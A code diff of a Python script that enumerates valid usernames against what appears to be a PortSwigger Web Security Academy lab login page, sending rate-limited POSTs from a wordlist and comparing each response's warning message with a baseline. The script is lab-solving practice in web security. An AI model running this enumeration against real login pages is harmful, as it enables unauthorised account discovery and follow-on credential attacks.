@@ -1,16 +1,20 @@
 from ratelimit import limits, RateLimitException, sleep_and_retry
 from requests import post
 from pathlib import Path
+try:
+    from BeautifulSoup import BeautifulSoup
+except:
+    from bs4 import BeautifulSoup
 
 ONE_MINUTE = 60
 MAX_CALLS_PER_MINUTE = 120
 
-url = ''
+url = 'https://INSTANCE-ID.web-security-academy.net/login'
 headers = {
-
+    'Referer': 'https://INSTANCE-ID.web-security-academy.net/'
 }
 cookies = {
-
+    'session': 'SESSION-COOKIE'
 }
 
 @sleep_and_retry
@@ -30,11 +34,15 @@ def enumerate_user(url, user_file_list, headers, cookies):
         headers=headers,
         cookies=cookies
     )
+    parsed_demarcation_res = BeautifulSoup(demarcation_response.text, features='html.parser')
+    demarcation_text = parsed_demarcation_res.body.find('p', attrs={'class': 'is-warning'}).text
     users = []
     with Path(user_file_list).open('r') as file:
         for user in file.readlines():
             res = make_user_call(url, user.strip(), headers, cookies)
-            if demarcation_response.text != res.text:
+            parsed_res = BeautifulSoup(res.text, features='html.parser')
+            parsed_res_text = parsed_res.body.find('p', attrs={'class': 'is-warning'}).text
+            if demarcation_text != parsed_res_text:
                 users.append(user.strip())
     return users
 
